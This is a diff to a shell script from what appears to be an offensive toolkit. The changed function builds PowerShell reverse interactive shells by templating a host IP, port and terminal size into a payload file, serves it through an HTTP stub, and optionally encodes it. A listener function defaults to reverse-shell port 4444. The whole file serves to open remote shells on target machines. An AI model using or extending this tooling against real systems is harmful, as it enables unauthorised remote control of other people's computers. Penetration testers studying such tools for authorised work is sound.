@@ -94,15 +94,16 @@ get_powershell_interactive_shell() {
         echo "HTTP port must be set before running interactive shell."
         return 1
     fi
-    cp $SCRIPTDIR/../ps1/reverse_interactive_shell.ps1 reverse_interactive_shell.ps1
-    sed -i -E 's/\{host_port\}/"'$host_port'";/g' reverse_interactive_shell.ps1
-    sed -i -E 's/\{host_ip\}/"'$host_ip'";/g' reverse_interactive_shell.ps1
+    local shell_file_name="reverse_interactive_shell_${host_ip}_${host_port}.ps1"
+    cp $SCRIPTDIR/../ps1/reverse_interactive_shell.ps1 $shell_file_name
+    sed -i -E 's/\{host_port\}/"'$host_port'";/g' $shell_file_name
+    sed -i -E 's/\{host_ip\}/"'$host_ip'";/g' $shell_file_name
     local stty_size=$(stty size)
     local stty_rows=$(echo "$stty_size" | awk '{print $1}')
     local stty_cols=$(echo "$stty_size" | awk '{print $2}')
-    sed -i -E 's/\{stty_rows\}/"'$stty_rows'";/g' reverse_interactive_shell.ps1
-    sed -i -E 's/\{stty_cols\}/"'$stty_cols'";/g' reverse_interactive_shell.ps1
-    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_interactive_shell_stub.ps1 | sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g')
+    sed -i -E 's/\{stty_rows\}/"'$stty_rows'";/g' $shell_file_name
+    sed -i -E 's/\{stty_cols\}/"'$stty_cols'";/g' $shell_file_name
+    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_interactive_shell_stub.ps1 | sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g' | sed -E 's/\$\{filename\}/'$shell_file_name'/g')
     if [ "$encode_shell" == "false" ]; then
         echo "$reverse_shell"
         return 0
@@ -167,6 +168,7 @@ get_nc_reverse_shell_powershell() {
 
 }
 
+
 start_listener() {
     if [ -z "$host_port" ]; then
         host_port=4444  # Default reverse shell port
@@ -214,9 +216,4 @@ is_listener_running() {
         echo "No listener is running on port $host_port."
         return 1
     fi
-}
-
-start_listener_command() {
-    current_dir=$(pwd)
-        
 }
